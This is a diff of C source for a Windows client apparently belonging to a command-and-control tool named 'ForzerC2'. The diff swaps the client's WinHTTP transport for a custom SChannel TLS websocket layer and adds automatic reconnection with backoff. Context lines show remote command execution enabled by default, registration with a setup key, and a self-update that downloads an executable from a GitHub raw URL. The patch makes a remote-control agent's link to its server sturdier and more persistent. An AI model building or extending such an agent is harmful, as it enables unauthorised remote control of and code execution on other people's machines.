@@ -1,10 +1,12 @@
 #define WIN32_LEAN_AND_MEAN
+#define SECURITY_WIN32
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <urlmon.h>
 #include <wincrypt.h>
-#include <winhttp.h>
+#include <schannel.h>
+#include <security.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -13,7 +15,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "secur32.lib")
 
 #define FORZER_UPDATE_URL \
     "https://raw.githubusercontent.com/Peter211231231231232131/ForzerC2/master/Forzer.exe"
@@ -84,11 +86,19 @@ static int do_update(void) {
 static int g_allow_remote = 1;
 static SOCKET g_sock = INVALID_SOCKET;
 
-/* wss (TLS) transport handles (WinHTTP) */
-static HINTERNET g_ws = NULL, g_ws_req = NULL, g_ws_conn = NULL, g_ws_sess = NULL;
+/* wss (TLS) transport via SCHANNEL */
+static int g_use_tls = 0;
+static CredHandle g_cred;
+static CtxtHandle g_ctx;
+static SOCKET g_tls_sock = INVALID_SOCKET;
+static SecPkgContext_StreamSizes g_ssizes;
+static BYTE *g_tls_in = NULL; static int g_tls_in_len = 0, g_tls_in_cap = 0;
+static BYTE *g_tls_out = NULL; static int g_tls_out_len = 0, g_tls_out_off = 0;
 
 static int tr_send(const char *data, int len);
 static int tr_recv(char *out, int cap);
+static int tls_send(const char *data, int len);
+static int tls_recv(char *out, int cap);
 
 static void base64(const BYTE *in, int n, char *out) {
     static const char t[] =
@@ -173,44 +183,64 @@ static int ws_send_frame(SOCKET s, unsigned char opcode, const char *data, int l
         for (int i = 0; i < 8; i++) hdr[2 + i] = (unsigned char)((long long)len >> (8 * (7 - i)));
         hl = 10;
     }
-    if (!sock_send_all(s, (char *)hdr, hl)) return 0;
-    if (!sock_send_all(s, (char *)mask, 4)) return 0;
-    char *masked = malloc(len > 0 ? len : 1);
-    if (!masked) return 0;
-    for (int i = 0; i < len; i++) masked[i] = data[i] ^ mask[i & 3];
-    int ok = sock_send_all(s, masked, len);
-    free(masked);
+    int framelen = hl + 4 + (len > 0 ? len : 0);
+    BYTE *frame = (BYTE *)malloc(framelen > 0 ? framelen : 1);
+    if (!frame) return 0;
+    memcpy(frame, hdr, hl);
+    memcpy(frame + hl, mask, 4);
+    if (len > 0) {
+        for (int i = 0; i < len; i++) frame[hl + 4 + i] = (BYTE)(data[i] ^ mask[i & 3]);
+    }
+    int ok;
+    if (g_use_tls) ok = tls_send((char *)frame, framelen);
+    else ok = sock_send_all(s, (char *)frame, framelen);
+    free(frame);
     return ok;
+}
+
+static int ws_net_recv_n(char *buf, int len) {
+    if (g_use_tls) {
+        int got = 0;
+        while (got < len) {
+            int r = tls_recv(buf + got, len - got);
+            if (r <= 0) return 0;
+            got += r;
+        }
+        return 1;
+    }
+    return sock_recv_n(g_sock, buf, len);
 }
 
 static int ws_recv(SOCKET s, char *out, int cap) {
     unsigned char h[2];
-    if (!sock_recv_n(s, (char *)h, 2)) return -1;
+    if (!ws_net_recv_n((char *)h, 2)) return -1;
     int opcode = h[0] & 0x0f;
     int masked = h[1] & 0x80;
     long long len = h[1] & 0x7f;
     if (len == 126) {
         unsigned char e[2];
-        if (!sock_recv_n(s, (char *)e, 2)) return -1;
+        if (!ws_net_recv_n((char *)e, 2)) return -1;
         len = (e[0] << 8) | e[1];
     } else if (len == 127) {
         unsigned char e[8];
-        if (!sock_recv_n(s, (char *)e, 8)) return -1;
+        if (!ws_net_recv_n((char *)e, 8)) return -1;
         len = 0;
         for (int i = 0; i < 8; i++) len = (len << 8) | e[i];
     }
     unsigned char mkey[4];
-    if (masked && !sock_recv_n(s, (char *)mkey, 4)) return -1;
-    if (len > cap - 1) {
+    if (masked && !ws_net_recv_n((char *)mkey, 4)) return -1;
+    if (len >= cap) {
         long long left = len; char tmp[512];
         while (left > 0) {
             int c = (int)(left > sizeof(tmp) ? sizeof(tmp) : left);
-            if (!sock_recv_n(s, tmp, c)) return -1;
+            if (!ws_net_recv_n(tmp, c)) return -1;
             left -= c;
         }
-        return -1;
+        /* Frame was larger than our buffer; skip it and keep reading the
+           next frame instead of killing the connection. */
+        return ws_recv(s, out, cap);
     }
-    if (!sock_recv_n(s, out, (int)len)) return -1;
+    if (!ws_net_recv_n(out, (int)len)) return -1;
     if (masked) for (long long i = 0; i < len; i++) out[i] ^= mkey[i & 3];
     out[len] = 0;
 
@@ -225,66 +255,253 @@ static int ws_recv(SOCKET s, char *out, int cap) {
 }
 
 /* ------------------------------------------------------------------ */
-/* wss (TLS) transport via WinHTTP                                    */
+/* wss (TLS) transport via SCHANNEL                                   */
 /* ------------------------------------------------------------------ */
 
-static int wss_handshake(const char *host, int port, const char *path) {
-    wchar_t whost[256], wpath[512];
-    if (!MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256)) return 1;
-    if (!MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512)) return 1;
+static int tls_send(const char *data, int len) {
+    int max = g_ssizes.cbMaximumMessage;
+    int off = 0;
+    while (off < len) {
+        int chunk = len - off;
+        if (chunk > max) chunk = max;
+        int msglen = g_ssizes.cbHeader + chunk + g_ssizes.cbTrailer;
+        BYTE *msg = malloc(msglen);
+        if (!msg) return 0;
+        memcpy(msg + g_ssizes.cbHeader, data + off, chunk);
+        SecBuffer bufs[4];
+        bufs[0].BufferType = SECBUFFER_STREAM_HEADER; bufs[0].pvBuffer = msg; bufs[0].cbBuffer = g_ssizes.cbHeader;
+        bufs[1].BufferType = SECBUFFER_DATA; bufs[1].pvBuffer = msg + g_ssizes.cbHeader; bufs[1].cbBuffer = chunk;
+        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER; bufs[2].pvBuffer = msg + g_ssizes.cbHeader + chunk; bufs[2].cbBuffer = g_ssizes.cbTrailer;
+        bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL; bufs[3].cbBuffer = 0;
+        SecBufferDesc bd = { SECBUFFER_VERSION, 4, bufs };
+        if (EncryptMessage(&g_ctx, 0, &bd, 0) != SEC_E_OK) { free(msg); return 0; }
+        int total = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
+        if (!sock_send_all(g_tls_sock, (char *)msg, total)) { free(msg); return 0; }
+        free(msg);
+        off += chunk;
+    }
+    return 1;
+}
 
-    g_ws_sess = WinHttpOpen(L"Forzer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!g_ws_sess) return 1;
-    g_ws_conn = WinHttpConnect(g_ws_sess, whost, (INTERNET_PORT)port, 0);
-    if (!g_ws_conn) { WinHttpCloseHandle(g_ws_sess); g_ws_sess = NULL; return 1; }
-    g_ws_req = WinHttpOpenRequest(g_ws_conn, L"GET", wpath, NULL,
-                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                  WINHTTP_FLAG_SECURE);
-    if (!g_ws_req) return 1;
+static int tls_recv(char *out, int cap) {
+    if (g_tls_out_len - g_tls_out_off > 0) {
+        int n = g_tls_out_len - g_tls_out_off;
+        if (n > cap) n = cap;
+        memcpy(out, g_tls_out + g_tls_out_off, n);
+        g_tls_out_off += n;
+        if (g_tls_out_off >= g_tls_out_len) {
+            free(g_tls_out); g_tls_out = NULL; g_tls_out_len = 0; g_tls_out_off = 0;
+        }
+        return n;
+    }
+    for (;;) {
+        BYTE tmp[16384];
+        int r = recv(g_tls_sock, (char *)tmp, sizeof(tmp), 0);
+        if (r <= 0) return -1;
+        if (g_tls_in_len + r > g_tls_in_cap) {
+            g_tls_in_cap = (g_tls_in_len + r) * 2;
+            g_tls_in = realloc(g_tls_in, g_tls_in_cap);
+        }
+        memcpy(g_tls_in + g_tls_in_len, tmp, r);
+        g_tls_in_len += r;
 
-    BYTE keyb[16];
-    rng_bytes(keyb, 16);
-    char keyb64[32];
-    base64(keyb, 16, keyb64);
-    char hdr[256];
-    snprintf(hdr, sizeof(hdr),
-             "Upgrade: websocket\r\nConnection: Upgrade\r\n"
-             "Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: %s\r\n", keyb64);
-    wchar_t whdr[512];
-    if (!MultiByteToWideChar(CP_UTF8, 0, hdr, -1, whdr, 512)) return 1;
-    if (!WinHttpAddRequestHeaders(g_ws_req, whdr, -1, WINHTTP_ADDREQ_FLAG_ADD))
+        SecBuffer bufs[4];
+        bufs[0].BufferType = SECBUFFER_DATA; bufs[0].pvBuffer = g_tls_in; bufs[0].cbBuffer = g_tls_in_len;
+        bufs[1].BufferType = SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL; bufs[1].cbBuffer = 0;
+        bufs[2].BufferType = SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL; bufs[2].cbBuffer = 0;
+        bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL; bufs[3].cbBuffer = 0;
+        SecBufferDesc bd = { SECBUFFER_VERSION, 4, bufs };
+        SECURITY_STATUS st = DecryptMessage(&g_ctx, &bd, 0, NULL);
+        if (st == SEC_E_OK) {
+            BYTE *plain = (BYTE *)bufs[1].pvBuffer;
+            int plainLen = bufs[1].cbBuffer;
+            BYTE *extra = (BYTE *)bufs[3].pvBuffer;
+            int extraLen = bufs[3].cbBuffer;
+            int consumed = (extraLen > 0) ? (int)(extra - g_tls_in) : g_tls_in_len;
+            int leftover = g_tls_in_len - consumed;
+            if (leftover > 0) memmove(g_tls_in, g_tls_in + consumed, leftover);
+            g_tls_in_len = leftover;
+            g_tls_out = malloc(plainLen > 0 ? plainLen : 1);
+            memcpy(g_tls_out, plain, plainLen);
+            g_tls_out_len = plainLen; g_tls_out_off = 0;
+            int n = plainLen; if (n > cap) n = cap;
+            memcpy(out, g_tls_out, n);
+            g_tls_out_off = n;
+            if (g_tls_out_off >= g_tls_out_len) {
+                free(g_tls_out); g_tls_out = NULL; g_tls_out_len = 0; g_tls_out_off = 0;
+            }
+            return n;
+        } else if (st == SEC_E_INCOMPLETE_MESSAGE) {
+            continue;
+        } else {
+            return -1;
+        }
+    }
+}
+
+static int tls_handshake(const char *host, int port) {
+    struct addrinfo hints, *res = NULL;
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    char ps[16];
+    snprintf(ps, sizeof(ps), "%d", port);
+    if (getaddrinfo(host, ps, &hints, &res) != 0) return 1;
+    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    if (s == INVALID_SOCKET) { freeaddrinfo(res); return 1; }
+    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
+        fprintf(stderr, "error: tls connect failed (%d)\n", WSAGetLastError());
+        closesocket(s); freeaddrinfo(res); return 1;
+    }
+    {
+        DWORD to = 10000;
+        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
+    }
+    freeaddrinfo(res);
+    g_tls_sock = s;
+    g_sock = s;
+
+    SCHANNEL_CRED sc;
+    memset(&sc, 0, sizeof(sc));
+    sc.dwVersion = SCHANNEL_CRED_VERSION;
+    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
+    TimeStamp ts;
+    if (AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL,
+                                  &sc, NULL, NULL, &g_cred, &ts) != SEC_E_OK) {
+        fprintf(stderr, "error: tls credential init failed (0x%lx)\n", GetLastError());
+        closesocket(s); g_tls_sock = INVALID_SOCKET; return 1;
+    }
+
+    SecBuffer inbuf[2];
+    SecBuffer outbuf[2];
+    SecBufferDesc inbd, outbd;
+    DWORD outFlags;
+    BYTE *extra = NULL;
+    DWORD extraLen = 0;
+    BOOL haveCtx = FALSE;
+    BOOL needSend = TRUE;
+    SECURITY_STATUS rc;
+
+    for (;;) {
+        outbuf[0].BufferType = SECBUFFER_TOKEN;
+        outbuf[0].pvBuffer = NULL;
+        outbuf[0].cbBuffer = 0;
+        outbuf[1].BufferType = SECBUFFER_ALERT;
+        outbuf[1].pvBuffer = NULL;
+        outbuf[1].cbBuffer = 0;
+        outbd.ulVersion = SECBUFFER_VERSION;
+        outbd.cBuffers = 2;
+        outbd.pBuffers = outbuf;
+
+        if (needSend) {
+            if (haveCtx && extraLen > 0) {
+                inbuf[0].BufferType = SECBUFFER_TOKEN;
+                inbuf[0].pvBuffer = extra;
+                inbuf[0].cbBuffer = extraLen;
+                inbuf[1].BufferType = SECBUFFER_EMPTY;
+                inbuf[1].pvBuffer = NULL;
+                inbuf[1].cbBuffer = 0;
+                inbd.ulVersion = SECBUFFER_VERSION;
+                inbd.cBuffers = 2;
+                inbd.pBuffers = inbuf;
+            } else {
+                inbd.ulVersion = SECBUFFER_VERSION;
+                inbd.cBuffers = 0;
+                inbd.pBuffers = NULL;
+            }
+            rc = InitializeSecurityContextA(&g_cred, haveCtx ? &g_ctx : NULL,
+                (SEC_CHAR *)host,
+                ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
+                ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM,
+                0, 0, haveCtx ? &inbd : NULL, 0, &g_ctx, &outbd, &outFlags, &ts);
+            if (outbuf[0].cbBuffer && outbuf[0].pvBuffer) {
+                sock_send_all(g_tls_sock, (char *)outbuf[0].pvBuffer, outbuf[0].cbBuffer);
+                FreeContextBuffer(outbuf[0].pvBuffer);
+                outbuf[0].pvBuffer = NULL; outbuf[0].cbBuffer = 0;
+            }
+            if (rc == SEC_E_OK || rc == SEC_I_CONTINUE_NEEDED) {
+                if (haveCtx && extraLen > 0) {
+                    int foundExtra = 0;
+                    for (int i = 0; i < 2; i++) {
+                        if (outbuf[i].BufferType == SECBUFFER_EXTRA) {
+                            foundExtra = 1;
+                            ULONG left = outbuf[i].cbBuffer;
+                            if (left == 0) {
+                                free(extra); extra = NULL; extraLen = 0;
+                            } else if (left < extraLen) {
+                                memmove(extra, extra + extraLen - left, left);
+                                extraLen = left;
+                            }
+                            break;
+                        }
+                    }
+                    if (!foundExtra) {
+                        free(extra); extra = NULL; extraLen = 0;
+                    }
+                }
+                if (rc == SEC_E_OK) { haveCtx = TRUE; break; }
+                haveCtx = TRUE;
+                needSend = FALSE;
+                continue;
+            }
+            fprintf(stderr, "error: tls handshake failed (0x%lx)\n", (DWORD)rc);
+            if (extra) free(extra);
+            return 1;
+        } else {
+            for (;;) {
+                BYTE rh[5];
+                int got = 0;
+                while (got < 5) {
+                    int r = recv(g_tls_sock, (char *)rh + got, 5 - got, 0);
+                    if (r <= 0) { if (extra) free(extra); return 1; }
+                    got += r;
+                }
+                int reclen = (rh[3] << 8) | rh[4];
+                if (reclen > 65536) { if (extra) free(extra); return 1; }
+                BYTE *body = (BYTE *)malloc(reclen);
+                got = 0;
+                while (got < reclen) {
+                    int r = recv(g_tls_sock, (char *)body + got, reclen - got, 0);
+                    if (r <= 0) { free(body); if (extra) free(extra); return 1; }
+                    got += r;
+                }
+                extra = (BYTE *)realloc(extra, extraLen + 5 + reclen);
+                memcpy(extra + extraLen, rh, 5);
+                memcpy(extra + extraLen + 5, body, reclen);
+                extraLen += 5 + reclen;
+                free(body);
+                break;
+            }
+            needSend = TRUE;
+        }
+    }
+    if (extra && extraLen > 0) {
+        g_tls_in = malloc(extraLen);
+        memcpy(g_tls_in, extra, extraLen);
+        g_tls_in_len = extraLen;
+        g_tls_in_cap = extraLen;
+    }
+    if (extra) free(extra);
+
+    if (QueryContextAttributesA(&g_ctx, SECPKG_ATTR_STREAM_SIZES, &g_ssizes) != SEC_E_OK)
         return 1;
-    if (!WinHttpSendRequest(g_ws_req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                            NULL, 0, 0, 0)) return 1;
-    if (!WinHttpReceiveResponse(g_ws_req, NULL)) return 1;
+    g_use_tls = 1;
 
-    g_ws = WinHttpWebSocketCompleteUpgrade(g_ws_req, 0);
-    if (!g_ws) return 1;
-    WinHttpCloseHandle(g_ws_req);
-    g_ws_req = NULL;
+    /* Clear the 10s recv timeout we set for the handshake; otherwise an idle
+       link (no traffic for 10s) makes recv() return 0 and the client tears
+       down the connection. The server's WebSocket ping keeps us alive. */
+    {
+        DWORD to = 0;
+        setsockopt(g_tls_sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
+    }
     return 0;
 }
 
 static int tr_send(const char *data, int len) {
-    if (g_ws) {
-        DWORD r = WinHttpWebSocketSend(g_ws, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
-                                       (PVOID)data, (DWORD)len);
-        return (r == ERROR_SUCCESS) ? len : -1;
-    }
     return ws_send_frame(g_sock, 0x1, data, len) ? len : -1;
 }
 
 static int tr_recv(char *out, int cap) {
-    if (g_ws) {
-        DWORD bytesRead = 0, closeStatus = 0;
-        WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
-        DWORD r = WinHttpWebSocketReceive(g_ws, out, (DWORD)cap, &bytesRead, &type);
-        if (r != ERROR_SUCCESS) return -1;
-        if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) return -1;
-        out[bytesRead] = 0;
-        return (int)bytesRead;
-    }
     return ws_recv(g_sock, out, cap);
 }
 
@@ -459,9 +676,16 @@ static int connect_mode(const char *url, const char *setup_key, const char *name
     if (g_allow_remote)
         printf("WARNING: remote command execution is ENABLED on this host.\n");
 
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        fprintf(stderr, "error: WSAStartup failed\n");
+        return 1;
+    }
+
     int is_wss = (strncmp(url, "wss://", 6) == 0);
     if (!is_wss && strncmp(url, "ws://", 5) != 0) {
         fprintf(stderr, "error: only ws:// and wss:// supported\n");
+        WSACleanup();
         return 1;
     }
     const char *auth = url + (is_wss ? 6 : 5);
@@ -499,16 +723,12 @@ static int connect_mode(const char *url, const char *setup_key, const char *name
     printf("connecting to %s:%d%s (%s)\n", host, port, path, is_wss ? "wss" : "ws");
 
     if (is_wss) {
-        if (wss_handshake(host, port, path) != 0) {
-            fprintf(stderr, "error: wss handshake failed\n");
+        if (tls_handshake(host, port) != 0) {
+            fprintf(stderr, "error: tls handshake failed\n");
+            WSACleanup();
             return 1;
         }
     } else {
-        WSADATA wsa;
-        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-            fprintf(stderr, "error: WSAStartup failed\n");
-            return 1;
-        }
         struct addrinfo hints, *res = NULL;
         memset(&hints, 0, sizeof(hints));
         hints.ai_family = AF_UNSPEC;
@@ -517,68 +737,83 @@ static int connect_mode(const char *url, const char *setup_key, const char *name
         snprintf(portstr, sizeof(portstr), "%d", port);
         if (getaddrinfo(host, portstr, &hints, &res) != 0) {
             fprintf(stderr, "error: cannot resolve %s\n", host);
+            WSACleanup();
             return 1;
         }
         SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
         if (s == INVALID_SOCKET) {
             fprintf(stderr, "error: socket() failed\n");
             freeaddrinfo(res);
+            WSACleanup();
             return 1;
         }
         if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
             fprintf(stderr, "error: connect() failed (%d)\n", WSAGetLastError());
             closesocket(s);
             freeaddrinfo(res);
+            WSACleanup();
             return 1;
         }
         freeaddrinfo(res);
         g_sock = s;
+    }
 
-        BYTE keyb[16];
-        rng_bytes(keyb, 16);
-        char keyb64[32];
-        base64(keyb, 16, keyb64);
-        char req[512];
-        snprintf(req, sizeof(req),
-                 "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
-                 "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
-                 "Sec-WebSocket-Version: 13\r\n\r\n",
-                 path, host, port, keyb64);
-        if (!sock_send_all(s, req, (int)strlen(req))) {
+    /* --- WebSocket HTTP upgrade (shared by ws and wss) --- */
+    BYTE keyb[16];
+    rng_bytes(keyb, 16);
+    char keyb64[32];
+    base64(keyb, 16, keyb64);
+    char req[512];
+    snprintf(req, sizeof(req),
+             "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
+             "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
+             "Sec-WebSocket-Version: 13\r\n\r\n",
+             path, host, port, keyb64);
+    if (g_use_tls) {
+        if (!tls_send(req, (int)strlen(req))) {
             fprintf(stderr, "error: handshake send failed\n");
+            WSACleanup();
             return 1;
         }
-        char resp[1024];
-        int rl = 0, r;
-        while (rl < (int)sizeof(resp) - 1) {
-            r = recv(s, resp + rl, 1, 0);
-            if (r <= 0) break;
-            rl += r;
-            if (rl >= 4 && resp[rl - 4] == '\r' && resp[rl - 3] == '\n' &&
-                resp[rl - 2] == '\r' && resp[rl - 1] == '\n')
-                break;
-        }
-        resp[rl] = 0;
-        if (strstr(resp, "101") == NULL) {
-            fprintf(stderr, "error: handshake failed:\n%s\n", resp);
+    } else {
+        if (!sock_send_all(g_sock, req, (int)strlen(req))) {
+            fprintf(stderr, "error: handshake send failed\n");
+            WSACleanup();
             return 1;
         }
-        char *acc = strstr(resp, "sec-websocket-accept:");
-        if (acc) {
-            acc = strchr(acc, ':') + 1;
-            while (*acc == ' ') acc++;
-            char server_acc[128] = {0};
-            int i = 0;
-            while (*acc && *acc != '\r' && *acc != '\n' && i < 127) server_acc[i++] = *acc++;
-            char concat[64];
-            snprintf(concat, sizeof(concat), "%s%s", keyb64, WS_GUID);
-            BYTE hash[20];
-            sha1((BYTE *)concat, (DWORD)strlen(concat), hash);
-            char expect[64];
-            base64(hash, 20, expect);
-            if (_stricmp(server_acc, expect) != 0)
-                printf("warning: server accept mismatch (continuing)\n");
-        }
+    }
+
+    char resp[1024];
+    int rl = 0, r;
+    while (rl < (int)sizeof(resp) - 1) {
+        r = g_use_tls ? tls_recv(resp + rl, 1) : recv(g_sock, resp + rl, 1, 0);
+        if (r <= 0) break;
+        rl += r;
+        if (rl >= 4 && resp[rl - 4] == '\r' && resp[rl - 3] == '\n' &&
+            resp[rl - 2] == '\r' && resp[rl - 1] == '\n')
+            break;
+    }
+    resp[rl] = 0;
+    if (strstr(resp, "101") == NULL) {
+        fprintf(stderr, "error: handshake failed:\n%s\n", resp);
+        WSACleanup();
+        return 1;
+    }
+    char *acc = strstr(resp, "sec-websocket-accept:");
+    if (acc) {
+        acc = strchr(acc, ':') + 1;
+        while (*acc == ' ') acc++;
+        char server_acc[128] = {0};
+        int i = 0;
+        while (*acc && *acc != '\r' && *acc != '\n' && i < 127) server_acc[i++] = *acc++;
+        char concat[64];
+        snprintf(concat, sizeof(concat), "%s%s", keyb64, WS_GUID);
+        BYTE hash[20];
+        sha1((BYTE *)concat, (DWORD)strlen(concat), hash);
+        char expect[64];
+        base64(hash, 20, expect);
+        if (_stricmp(server_acc, expect) != 0)
+            printf("warning: server accept mismatch (continuing)\n");
     }
 
     printf("websocket connected\n");
@@ -595,6 +830,7 @@ static int connect_mode(const char *url, const char *setup_key, const char *name
              setup_key && *setup_key ? setup_key : "changeme");
     if (tr_send(reg, (int)strlen(reg)) <= 0) {
         fprintf(stderr, "error: register send failed\n");
+        WSACleanup();
         return 1;
     }
     printf("sent register; waiting for server...\n");
@@ -602,11 +838,13 @@ static int connect_mode(const char *url, const char *setup_key, const char *name
 
     HANDLE thr = CreateThread(NULL, 0, reader_thread, NULL, 0, NULL);
 
-    char buf[16384];
+    char buf[131072];
+    int reconnect = 0;
     for (;;) {
-        int n = tr_recv(buf, sizeof(buf));
+        int n = tr_recv(buf, sizeof(buf) - 1);
         if (n < 0) {
             printf("connection closed\n");
+            reconnect = 1;
             break;
         }
         buf[n] = 0;
@@ -666,20 +904,52 @@ static int connect_mode(const char *url, const char *setup_key, const char *name
         fclose(stdin);
         WaitForSingleObject(thr, 1000);
         CloseHandle(thr);
+        thr = NULL;
     }
-    if (is_wss) {
-        if (g_ws) {
-            WinHttpWebSocketClose(g_ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
-            WinHttpCloseHandle(g_ws);
-            g_ws = NULL;
-        }
-        if (g_ws_conn) { WinHttpCloseHandle(g_ws_conn); g_ws_conn = NULL; }
-        if (g_ws_sess) { WinHttpCloseHandle(g_ws_sess); g_ws_sess = NULL; }
+
+    /* Tear down the current socket before (re)connecting. */
+    if (g_use_tls) {
+        DeleteSecurityContext(&g_ctx);
+        FreeCredentialsHandle(&g_cred);
+        if (g_tls_sock != INVALID_SOCKET) closesocket(g_tls_sock);
+        g_tls_sock = INVALID_SOCKET;
+        g_use_tls = 0;
+        g_sock = INVALID_SOCKET;
+        if (g_tls_in) { free(g_tls_in); g_tls_in = NULL; g_tls_in_len = g_tls_in_cap = 0; }
+        if (g_tls_out) { free(g_tls_out); g_tls_out = NULL; g_tls_out_len = g_tls_out_off = 0; }
     } else {
         closesocket(g_sock);
         g_sock = INVALID_SOCKET;
-        WSACleanup();
     }
+
+    if (reconnect) {
+        /* Auto-reconnect with exponential backoff so a dropped link (idle
+           timeout, transient network blip, server restart) doesn't end the
+           tool. */
+        int attempt = 0;
+        for (;;) {
+            attempt++;
+            int delay = attempt < 6 ? (1 << attempt) : 60; /* 2,4,8,16,32,60s */
+            printf("reconnecting in %d s (attempt %d)...\n", delay, attempt);
+            Sleep(delay * 1000);
+            /* Re-run connect+handshake+register from the top of connect_mode. */
+            WSACleanup();
+            return connect_mode(url, setup_key, name);
+        }
+    }
+    if (g_use_tls) {
+        DeleteSecurityContext(&g_ctx);
+        FreeCredentialsHandle(&g_cred);
+        if (g_tls_sock != INVALID_SOCKET) closesocket(g_tls_sock);
+        g_tls_sock = INVALID_SOCKET;
+        g_use_tls = 0;
+        if (g_tls_in) { free(g_tls_in); g_tls_in = NULL; g_tls_in_len = g_tls_in_cap = 0; }
+        if (g_tls_out) { free(g_tls_out); g_tls_out = NULL; g_tls_out_len = g_tls_out_off = 0; }
+    } else {
+        closesocket(g_sock);
+        g_sock = INVALID_SOCKET;
+    }
+    WSACleanup();
     return 0;
 }
 
